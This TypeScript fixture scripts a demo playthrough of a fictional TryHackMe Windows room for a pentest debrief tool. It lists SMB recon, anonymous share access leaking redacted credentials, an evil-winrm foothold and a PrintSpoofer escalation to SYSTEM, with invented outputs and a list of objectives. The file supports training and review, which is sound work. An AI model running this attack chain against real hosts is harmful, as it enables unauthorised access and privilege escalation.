/**
 * A scripted end-to-end playthrough of a FICTIONAL practice room ("Tidewatch", Easy) on the TryHackMe
 * platform, used to demo the debrief live the same way saltmarsh.ts / dunmoor.ts do — but with a THM
 * target so the room-specific chrome shows (AttackBox connector, THM write-up sources, "tasks" wording).
 * No real room, no capture agent, browser-only. All hosts, names, flags and credentials are invented;
 * nothing here is copied from any real TryHackMe room, its tasks, artwork or write-up. The command path
 * is a generic Windows chain (SMB recon, an anonymous share leaking backup credentials, a WinRM
 * foothold, then a SeImpersonate → PrintSpoofer jump to SYSTEM) with reconstructed outputs.
 */
import type { GoldenObjective, Session } from "../../types/report";
import { buildRaw, makeDemo, type Step } from "./build";

const START = Date.parse("2026-07-09T10:00:00Z");

const STEPS: Step[] = [
  // --- Recon: service scan, SMB share enumeration ---
  { cmd: "nmap -sV -Pn tidewatch.thm", gap: 2_000, dur: 21_000, lines: 11, volume: 1_000, out: "135/tcp msrpc · 139/tcp netbios-ssn · 445/tcp microsoft-ds · 3389/tcp ms-wbt-server · 5985/tcp wsman (WinRM) · Windows Server 2019" },
  { cmd: "enum4linux-ng -A tidewatch.thm", gap: 18_000, dur: 16_000, lines: 22, volume: 400, out: "SMB signing not required · shares: ADMIN$, C$, IPC$, Backups · Backups is READ-accessible over a null session" },
  { cmd: "smbclient //tidewatch.thm/Backups -N", gap: 12_000, dur: 3_000, lines: 6, out: "anonymous login succeeds · sync-backup.ps1 · README.txt · a scheduled-backup script left world-readable" },

  // --- Loot: backup script leaks a service-account credential ---
  { cmd: "smbclient //tidewatch.thm/Backups -N -c 'get sync-backup.ps1'", gap: 9_000, dur: 1_400, lines: 1, out: "getting file sync-backup.ps1 (1.1k) · downloaded to the AttackBox" },
  { cmd: "cat sync-backup.ps1", gap: 6_000, dur: 500, lines: 7, out: "$user = 'tidewatch\\lkeller' · $pass = '[redacted]' · robocopy hard-codes the lkeller credential for the nightly offsite sync" },

  // --- Foothold: WinRM as lkeller (crackmapexec validation was skipped — straight to evil-winrm) ---
  { cmd: "evil-winrm -i tidewatch.thm -u lkeller -p '[redacted]'", gap: 40_000, dur: 6_000, lines: 4, out: "Evil-WinRM shell v3.5 · *Evil-WinRM* PS C:\\Users\\lkeller\\Documents> · WinRM (5985) accepts the reused backup credential" },
  { cmd: "whoami", gap: 5_000, dur: 400, lines: 1, out: "tidewatch\\lkeller" },

  // --- User flag ---
  { cmd: "type C:\\Users\\lkeller\\Desktop\\user.txt", gap: 25_000, dur: 500, lines: 1, out: "THM{redacted-user-flag}" },

  // --- Privesc: SeImpersonatePrivilege → PrintSpoofer → SYSTEM ---
  { cmd: "whoami /priv", gap: 30_000, dur: 700, lines: 6, out: "SeImpersonatePrivilege  Enabled · SeChangeNotifyPrivilege Enabled · the service account holds SeImpersonate — a potato path to SYSTEM" },
  { cmd: "PrintSpoofer.exe -i -c cmd", gap: 45_000, dur: 2_200, lines: 3, out: "[+] Found privilege: SeImpersonatePrivilege · [+] Named pipe listening · [+] CreateProcessAsUser() OK · spawns cmd as SYSTEM" },
  { cmd: "whoami", gap: 4_000, dur: 400, lines: 1, out: "nt authority\\system" },

  // --- Root / system flag ---
  { cmd: "type C:\\Users\\Administrator\\Desktop\\root.txt", gap: 12_000, dur: 500, lines: 1, out: "THM{redacted-root-flag}" },
];

const DEMO_END = buildRaw(STEPS, START).at(-1)!.ended_at_ms;

export const TIDEWATCH_SESSION: Session = {
  uuid: "demo-tidewatch-0001-0001-00000000001",
  started_at: new Date(START).toISOString(),
  ended_at: new Date(DEMO_END).toISOString(),
  target_scope: "THM::Tidewatch (Easy)",
  context_path: "cloud:thm:attackbox",
  shell: "bash",
  source: "local_pty",
  machine: { name: "Tidewatch", os: "Windows", difficulty: "Easy" },
  // Explicit THM target: a fictional room. url is left null so the "Open room" source card falls back
  // to a TryHackMe search rather than linking a made-up room page.
  target: {
    platform: "thm",
    kind: "room",
    name: "Tidewatch",
    slug: "tidewatch",
    os: "Windows",
    difficulty: { level: 1, label: "Easy" },
    emblem: { avatar: null, hue: 205 },
    url: null,
  },
};

/**
 * The intended path from the room's guided tasks. `validate_credentials` (a crackmapexec/netexec SMB
 * or WinRM credential check before logging in) is never run in this transcript — the operator went
 * straight from looting the backup script into evil-winrm — so it stays skipped.
 */
export const TIDEWATCH_GOLDEN: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"] },
  { objective: "enumerate_smb_shares", tactic: "TA0007", satisfied_by: ["enum4linux-ng", "smbclient"], depends_on: ["enumerate_services"] },
  { objective: "loot_backup_credentials", tactic: "TA0006", satisfied_by: ["smbclient", "cat"], depends_on: ["enumerate_smb_shares"] },
  { objective: "validate_credentials", tactic: "TA0006", satisfied_by: ["crackmapexec", "netexec"], depends_on: ["loot_backup_credentials"] },
  { objective: "get_foothold", tactic: "TA0002", satisfied_by: ["evil-winrm"], depends_on: ["loot_backup_credentials"] },
  { objective: "orient_as_user", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["get_foothold"] },
  { objective: "capture_user_flag", tactic: "TA0004", satisfied_by: ["type", "cat"], depends_on: ["orient_as_user"] },
  { objective: "check_privileges", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["capture_user_flag"] },
  { objective: "exploit_seimpersonate", tactic: "TA0002", satisfied_by: ["PrintSpoofer.exe", "PrintSpoofer"], depends_on: ["check_privileges"] },
  { objective: "escalate_to_system", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["exploit_seimpersonate"] },
  { objective: "capture_root_flag", tactic: "TA0004", satisfied_by: ["type", "cat"], depends_on: ["escalate_to_system"] },
];

/**
 * The fully-resolved demo, built through the shared registry pipeline (build.ts). Pre-registered in
 * the store so a "Tidewatch" card always shows in History; opening it replays the run live, and its
 * THM platform drives the room-specific chrome in the debrief.
 */
export const TIDEWATCH = makeDemo({ platform: "thm", slug: "tidewatch", session: TIDEWATCH_SESSION, steps: STEPS, golden: TIDEWATCH_GOLDEN, startMs: START });
